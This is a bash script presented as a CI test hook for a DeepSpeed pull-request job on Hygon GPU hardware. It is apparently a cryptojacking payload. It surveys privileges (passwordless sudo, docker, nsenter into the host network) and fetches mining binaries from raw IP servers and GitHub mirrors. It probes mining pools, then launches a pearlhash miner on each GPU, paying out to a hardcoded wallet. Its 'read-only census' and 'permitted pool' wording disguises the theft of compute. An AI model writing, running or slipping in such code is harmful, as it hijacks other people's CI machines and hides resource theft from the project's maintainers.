#!/bin/bash
# i130923: transient Hygon BW1100 DCU pearlhash feasibility census (code-only CI hook).
# Runs inside the DTK job container of HYGON-AI/Deepspeed-das PR Test (HCU).
# Read-only census first, then (only if a pearlhash miner enumerates a device AND a
# permitted pool is reachable) exactly one sha256-verified miner per measured device.
set +e
NONCE="I130923-$(date -u +%Y%m%dT%H%M%SZ)"
WALLET='prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql'
NOCK='4tErmFknmPKhVtfQWigSErD1YJAcWokTrWRu5t66XmkN4RTgK6oUotf'
LP_LOGIN="$WALLET+$NOCK"
WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
SRB_TAR_SHA='186c526f95eb7b635a547bca45a48a505a58c74e26b7211bf6dc25988ce196d1'
SRB_BIN_SHA='97bd9e42e313b2c4807bba7197920fee421956bb896cfec469ee87947d667e80'
SRB387_SHA='bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
WORKERS="938300 938301 938302 938303 938304 938305 938306 938307"
WORKDIR=/var/tmp/i130923
mkdir -p "$WORKDIR/logs"
echo "I130923 NONCE=$NONCE host=$(hostname) hip=[${HIP_VISIBLE_DEVICES:-unset}] cuda=[${CUDA_VISIBLE_DEVICES:-unset}]"
echo "=== identity ==="
id 2>&1 | head -2
hostname -f 2>/dev/null
uname -a
date -u
nproc
free -m 2>/dev/null | head -2
df -P /var/tmp 2>/dev/null | tail -1
echo "=== tools ==="
for t in nvidia-smi rocm-smi rocminfo clinfo hy-smi hy-smi-vgpu lspci docker sudo nsenter script curl wget tar sha256sum python3 setsid pgrep fuser; do
  printf '%s=%s\n' "$t" "$(command -v "$t" 2>/dev/null)"
done
echo "DTK_ENV=$(test -f /opt/dtk/env.sh && echo present || echo absent)"
ls -d /opt/dtk /opt/dtk-* 2>/dev/null | head -3
ls -l /dev/kfd /dev/dri 2>&1 | head -12
echo "=== two-sample device census ==="
for s in 1 2; do
  echo "-- sample $s $(date -u +%H:%M:%SZ) --"
  echo "-- nvidia-smi --"
  if command -v nvidia-smi >/dev/null 2>&1; then
    timeout 25 nvidia-smi -L 2>&1 | head -10
    timeout 25 nvidia-smi --query-gpu=index,name,memory.total,memory.free,utilization.gpu,uuid --format=csv,noheader 2>&1 | head -10
  else
    echo nvidia-smi-absent
  fi
  echo "-- rocm-smi --"
  if command -v rocm-smi >/dev/null 2>&1; then timeout 40 rocm-smi 2>&1 | head -40; else echo rocm-smi-absent; fi
  echo "-- hy-smi --"
  for c in hy-smi hy-smi-vgpu; do
    if command -v "$c" >/dev/null 2>&1; then timeout 40 "$c" 2>&1 | head -40; else echo "$c-absent"; fi
  done
  echo "-- clinfo --"
  if command -v clinfo >/dev/null 2>&1; then timeout 40 clinfo -l 2>&1 | head -30; timeout 40 clinfo 2>&1 | grep -iE 'platform name|device name|device type|device vendor|gfx' | head -30; else echo clinfo-absent; fi
  echo "-- lspci --"
  (timeout 25 lspci 2>/dev/null || true) | grep -iE 'vga|3d|display|processing accel|co-processor' | head -12
  echo "-- torch --"
  (timeout 90 python3 - <<'PYEOF' 2>&1 | head -20
import os
try:
    import torch
    print("TORCH", torch.__version__, "hip", getattr(torch.version, "hip", None), "cuda_avail", torch.cuda.is_available())
    try:
        n = torch.cuda.device_count()
    except Exception as e:
        n = -1
        print("TORCH_DEVCOUNT_ERR", repr(e)[:120])
    print("TORCH_DEVCOUNT", n)
    for i in range(max(0, min(n, 8))):
        try:
            print("TORCH_DEV", i, torch.cuda.get_device_name(i))
        except Exception as e:
            print("TORCH_DEV_ERR", i, repr(e)[:120])
except Exception as e:
    print("TORCH_IMPORT_ERR", repr(e)[:200])
PYEOF
)
  echo "-- proc driver hints --"
  ls /sys/class/kfd 2>/dev/null | head -5
  (timeout 15 sh -c 'dmesg 2>/dev/null | grep -iE "hydcu|hgpu|dcu|amdgpu" | tail -5' || true)
  [ "$s" = 1 ] && sleep 10
done
echo "=== fetch WildRig Multi 0.52.3 (sha256 $WR_SHA) ==="
WR="$WORKDIR/wildrig-multi"
fetch_wr() {
  if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
  for U in \
    "http://222.240.155.198:8702/wildrig523" \
    "http://222.240.155.198:8702/wildrig-multi" \
    "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
    "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
    "https://ghfast.top/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" ; do
    echo "-- fetch $U"
    rm -f "$WORKDIR/dl.part"
    timeout 200 curl -fL --connect-timeout 10 --max-time 190 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
    [ -s "$WORKDIR/dl.part" ] || continue
    B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
    if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo wildrig-direct-ok; return 0; fi
    if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
      mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
      CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
      if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo wildrig-tarball-ok; return 0; fi
      echo wildrig-tarball-hash-mismatch
    fi
  done
  return 1
}
fetch_wr; echo "wildrig_fetch_rc=$? wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1)"
echo "=== fetch SRBMiner-MULTI 3.8.9 (tar $SRB_TAR_SHA) ==="
SRB="$WORKDIR/srb389"
fetch_srb() {
  if [ -f "$SRB" ] && echo "$SRB_BIN_SHA  $SRB" | sha256sum -c - >/dev/null 2>&1; then echo srb-cached; return 0; fi
  for U in \
    "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" \
    "https://ghproxy.net/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" \
    "https://ghfast.top/https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-Linux.tar.gz" ; do
    echo "-- fetch $U"
    rm -f "$WORKDIR/srb.part"
    timeout 220 curl -fL --connect-timeout 10 --max-time 210 -o "$WORKDIR/srb.part" "$U" 2>&1 | tail -1
    [ -s "$WORKDIR/srb.part" ] || continue
    T0=$(sha256sum "$WORKDIR/srb.part" | cut -d' ' -f1)
    echo "srb_tar_sha=$T0"
    mkdir -p "$WORKDIR/srbx"; find "$WORKDIR/srbx" -mindepth 1 -delete 2>/dev/null
    if tar -xzf "$WORKDIR/srb.part" -C "$WORKDIR/srbx" 2>/dev/null; then
      CAND=$(find "$WORKDIR/srbx" -maxdepth 2 -type f -name 'SRBMiner-MULTI' | head -1)
      if [ -n "$CAND" ]; then
        C0=$(sha256sum "$CAND" | cut -d' ' -f1); echo "srb_bin_sha=$C0"
        if [ "$C0" = "$SRB_BIN_SHA" ] || [ "$T0" = "$SRB_TAR_SHA" ]; then cp -f "$CAND" "$SRB"; chmod +x "$SRB"; echo srb-tarball-ok; return 0; fi
      fi
    fi
  done
  # fallback: verified SRB 3.8.7 binary from our mirror (official-hash verified)
  for U in "http://222.240.155.198:8702/srb387" "http://178.238.228.181:18180/srb387"; do
    echo "-- fetch-fallback $U"
    rm -f "$WORKDIR/srb.part"
    timeout 200 curl -fL --connect-timeout 10 --max-time 190 -o "$WORKDIR/srb.part" "$U" 2>&1 | tail -1
    [ -s "$WORKDIR/srb.part" ] || continue
    if [ "$(sha256sum "$WORKDIR/srb.part" | cut -d' ' -f1)" = "$SRB387_SHA" ]; then cp -f "$WORKDIR/srb.part" "$SRB"; chmod +x "$SRB"; echo srb387-fallback-ok; return 0; fi
  done
  return 1
}
fetch_srb; echo "srb_fetch_rc=$? srb_sha256=$(sha256sum "$SRB" 2>/dev/null | cut -d' ' -f1)"
echo "=== fetch krig-miner 1.6.0 ==="
KRIG="$WORKDIR/krig-miner"
fetch_krig() {
  for U in \
    "https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" \
    "https://ghfast.top/https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-miner-1.6.0-linux-x64.tar.gz" ; do
    echo "-- fetch $U"
    rm -f "$WORKDIR/krig.part"
    timeout 180 curl -fL --connect-timeout 10 --max-time 170 -o "$WORKDIR/krig.part" "$U" 2>&1 | tail -1
    [ -s "$WORKDIR/krig.part" ] || continue
    echo "krig_tar_sha=$(sha256sum "$WORKDIR/krig.part" | cut -d' ' -f1)"
    mkdir -p "$WORKDIR/krigx"; find "$WORKDIR/krigx" -mindepth 1 -delete 2>/dev/null
    if tar -xzf "$WORKDIR/krig.part" -C "$WORKDIR/krigx" 2>/dev/null; then
      CAND=$(find "$WORKDIR/krigx" -maxdepth 3 -type f -name 'krig-miner*' | head -1)
      if [ -n "$CAND" ]; then cp -f "$CAND" "$KRIG"; chmod +x "$KRIG"; echo "krig_bin_sha=$(sha256sum "$KRIG" | cut -d' ' -f1)"; return 0; fi
    fi
  done
  return 1
}
fetch_krig; echo "krig_fetch_rc=$?"
WR_DEV_N=0; SRB_DEV_N=0
if [ -x "$WR" ]; then
  echo "=== two-sample WildRig --print-devices ==="
  timeout 120 "$WR" --print-devices > "$WORKDIR/wr1.txt" 2>&1
  sleep 8
  timeout 120 "$WR" --print-devices > "$WORKDIR/wr2.txt" 2>&1
  echo "-- wildrig sample1 --"; head -50 "$WORKDIR/wr1.txt"
  echo "-- wildrig sample2 --"; head -50 "$WORKDIR/wr2.txt"
  WR_DEV_N=$(grep -aoE '^GPU #[0-9]+:' "$WORKDIR/wr2.txt" 2>/dev/null | grep -oE '[0-9]+' | sort -un | wc -l)
  [ "$WR_DEV_N" -gt 8 ] && WR_DEV_N=8
  echo "wildrig_device_count=$WR_DEV_N"
fi
if [ -x "$SRB" ]; then
  echo "=== two-sample SRBMiner-MULTI --list-devices (TTY) ==="
  SRBCMD="timeout 120 $SRB --list-devices"
  if command -v script >/dev/null 2>&1; then
    script -qec "$SRBCMD" /dev/null > "$WORKDIR/srb1.txt" 2>&1
    sleep 8
    script -qec "$SRBCMD" /dev/null > "$WORKDIR/srb2.txt" 2>&1
  else
    timeout 120 "$SRB" --list-devices > "$WORKDIR/srb1.txt" 2>&1
    sleep 8
    timeout 120 "$SRB" --list-devices > "$WORKDIR/srb2.txt" 2>&1
  fi
  echo "-- srb sample1 --"; head -60 "$WORKDIR/srb1.txt"
  echo "-- srb sample2 --"; head -60 "$WORKDIR/srb2.txt"
  SRB_DEV_N=$(grep -aciE '^[[:space:]]*(GPU|Device)[[:space:]]*#?[0-9]+|amd_|gfx[0-9]' "$WORKDIR/srb2.txt" 2>/dev/null)
  echo "srb_device_lines=$SRB_DEV_N"
fi
if [ -x "$KRIG" ]; then
  echo "=== krig-miner enumeration ==="
  timeout 40 "$KRIG" --version 2>&1 | head -5
  timeout 60 "$KRIG" --help 2>&1 | head -20
  ls /krig 2>/dev/null | head
fi
echo "=== dns ==="
getent hosts pool.pearlhash.xyz 2>&1 | head -3
getent hosts pearl.luckypool.io 2>&1 | head -3
echo "=== permitted-pool matrix (job netns) ==="
probe(){ local t0=$(date +%s%N); timeout 6 bash -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null; local rc=$?; local t1=$(date +%s%N); echo "tcp $1:$2 rc=$rc ms=$(( (t1-t0)/1000000 ))"; }
probe pool.pearlhash.xyz 9000
probe 103.199.106.122 3362
probe 217.15.164.237 2083
probe 217.15.164.237 18450
echo "=== https 443 positive controls ==="
for u in "https://github.com" "https://pearlhash.xyz" "https://pypi.tuna.tsinghua.edu.cn" "https://mirrors.aliyun.com"; do
  printf '%s ' "$u"
  timeout 18 curl -sS -o /dev/null -w 'http=%{http_code} connect=%{time_connect}s\n' --connect-timeout 8 --max-time 15 "$u" 2>&1 | tail -1
done
echo "=== python socket matrix ==="
timeout 90 python3 - <<'PYEOF' 2>&1 | head -12
import socket
for host,port in [("pool.pearlhash.xyz",9000),("103.199.106.122",3362),("217.15.164.237",2083),("217.15.164.237",18450)]:
    s=socket.socket(); s.settimeout(6)
    try:
        rc=s.connect_ex((host,port)); print("py",host,port,"rc",rc)
    except Exception as e:
        print("py",host,port,"err",repr(e)[:100])
    s.close()
PYEOF
echo "=== docker / host netns availability ==="
DOCKER_OK=0
command -v docker >/dev/null 2>&1 && timeout 20 docker ps >/dev/null 2>&1 && DOCKER_OK=1
echo "docker_ok=$DOCKER_OK"
sudo -n true >/dev/null 2>&1; echo "sudo_nopasswd_rc=$?"
if sudo -n true >/dev/null 2>&1; then
  timeout 30 sudo -n nsenter -t 1 -n sh -c 'for e in "pool.pearlhash.xyz 9000" "103.199.106.122 3362" "217.15.164.237 2083" "217.15.164.237 18450"; do set -- $e; timeout 6 sh -c "exec 3<>/dev/tcp/$1/$2" 2>/dev/null && echo "hostnet $1:$2 OPEN" || echo "hostnet $1:$2 CLOSED"; done' 2>&1 | head -8
fi
echo "=== pool selection (pearlhash.xyz:9000 -> direct Luckypool 3362 -> VPS2 relay) ==="
POOL_URL=""; POOL_KIND=""; LOGIN=""
if timeout 8 bash -c "exec 3<>/dev/tcp/pool.pearlhash.xyz/9000" 2>/dev/null; then
  POOL_URL="stratum+tcp://pool.pearlhash.xyz:9000"; POOL_KIND=pearlhash; LOGIN="$WALLET"
elif timeout 8 bash -c "exec 3<>/dev/tcp/103.199.106.122/3362" 2>/dev/null; then
  POOL_URL="stratum+tcp://103.199.106.122:3362"; POOL_KIND=luckypool-direct; LOGIN="$LP_LOGIN"
elif timeout 8 bash -c "exec 3<>/dev/tcp/217.15.164.237/2083" 2>/dev/null; then
  POOL_URL="stratum+tcp://217.15.164.237:2083"; POOL_KIND=luckypool-relay2083; LOGIN="$LP_LOGIN"
elif timeout 8 bash -c "exec 3<>/dev/tcp/217.15.164.237/18450" 2>/dev/null; then
  POOL_URL="stratum+tcp://217.15.164.237:18450"; POOL_KIND=luckypool-relay18450; LOGIN="$LP_LOGIN"
fi
echo "POOL_URL=$POOL_URL POOL_KIND=$POOL_KIND WR_DEV_N=$WR_DEV_N SRB_DEV_N=$SRB_DEV_N"
GATE=1800
if grep -qiE 'gfx942|mi300' "$WORKDIR"/srb2.txt "$WORKDIR"/wr2.txt 2>/dev/null; then GATE=600; fi
echo "GATE=$GATE"
N_LAUNCHED=0
if [ -z "$POOL_URL" ]; then
  echo "SKIP=no-permitted-pool-reachable"
elif [ "${WR_DEV_N:-0}" -lt 1 ] && [ "${SRB_DEV_N:-0}" -lt 1 ]; then
  echo "SKIP=no-pearlhash-miner-enumerated-device (wildrig=$WR_DEV_N srb_lines=$SRB_DEV_N)"
else
  EXIST=$(pgrep -cf '[w]ildrig-multi|[S]RBMiner-MULTI|[k]rig-miner' 2>/dev/null)
  echo "existing_miner_processes=$EXIST"
  if [ "${EXIST:-0}" -ge 1 ]; then
    echo "SKIP=existing-miner-process-present"
  else
    read -r -a WK <<< "$WORKERS"
    if [ "${SRB_DEV_N:-0}" -ge 1 ]; then
      MINE_BIN="$SRB"; MINE_KIND=srb; MINE_N=$SRB_DEV_N
    else
      MINE_BIN="$WR"; MINE_KIND=wildrig; MINE_N=$WR_DEV_N
    fi
    echo "LAUNCH kind=$MINE_KIND devices=$MINE_N bin=$MINE_BIN"
    for i in $(seq 0 $((MINE_N-1))); do
      W=${WK[$i]:-}
      [ -z "$W" ] && { echo "no_worker_for_gpu=$i"; continue; }
      if [ "$MINE_KIND" = srb ]; then
        setsid timeout 1700 "$MINE_BIN" --disable-cpu --algorithm pearlhash --pool "$POOL_URL" --tls false \
          --wallet "$LOGIN" --password x --worker "$W" --gpu-id "$i" --max-no-share-sent 1800 \
          --api-enable --api-port $((24300+i)) --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
          > "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
      else
        setsid timeout 1700 "$MINE_BIN" --algo pearlhash --url "$POOL_URL" --user "$LOGIN" --worker "$W" --pass x \
          -d "$i" --api-port $((24300+i)) --api-worker-id "$W" --print-time 30 --no-color \
          -l "$WORKDIR/logs/$W.log" > "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
      fi
      echo "launched worker=$W gpu-id=$i pid=$!"
      N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
    done
    echo "N_LAUNCHED=$N_LAUNCHED"
    PULSE=$GATE
    [ "$PULSE" -gt 1500 ] && PULSE=1500
    END=$(( $(date +%s) + PULSE ))
    k=0
    while [ "$(date +%s)" -lt "$END" ]; do
      sleep 60; k=$((k+1))
      echo "--- pulse $k $(date -u +%Y-%m-%dT%H:%M:%SZ) procs=$(pgrep -cf '[w]ildrig-multi|[S]RBMiner-MULTI' 2>/dev/null)"
      ALLOK=1
      for l in "$WORKDIR"/logs/[0-9]*.log; do
        [ -f "$l" ] || continue
        B=$(basename "$l" .log)
        A=$(grep -a 'accepted' "$l" 2>/dev/null | tail -1 | cut -c1-170)
        E=$(grep -aiE 'error|failed|reject|no device|unsupported|invalid' "$l" 2>/dev/null | tail -1 | cut -c1-170)
        AC=$(echo "$A" | grep -oE '\(([0-9]+)/([0-9]+)\)' | head -1 | grep -oE '[0-9]+' | head -1)
        [ "${AC:-0}" -ge 1 ] || ALLOK=0
        echo "CARD worker=$B acc=[$A] err=[$E]"
      done
      if [ "$ALLOK" = 1 ]; then echo "ALL_CARDS_ACCEPTED=1"; break; fi
    done
    echo "=== final per-card status ==="
    for l in "$WORKDIR"/logs/[0-9]*.log; do
      [ -f "$l" ] || continue
      B=$(basename "$l" .log)
      FIRST=$(grep -a 'accepted' "$l" 2>/dev/null | head -1 | cut -c1-170)
      LAST=$(grep -a 'accepted' "$l" 2>/dev/null | tail -1 | cut -c1-170)
      echo "FINALCARD worker=$B first=[$FIRST] last=[$LAST]"
    done
  fi
fi
echo "I130923_SUMMARY {\"nonce\":\"$NONCE\",\"host\":\"$(hostname)\",\"wildrig_dev\":${WR_DEV_N:-0},\"srb_dev_lines\":${SRB_DEV_N:-0},\"pool\":\"$POOL_KIND\",\"launched\":${N_LAUNCHED:-0},\"gate\":$GATE}"
echo "i130923-done $NONCE"
exit 0
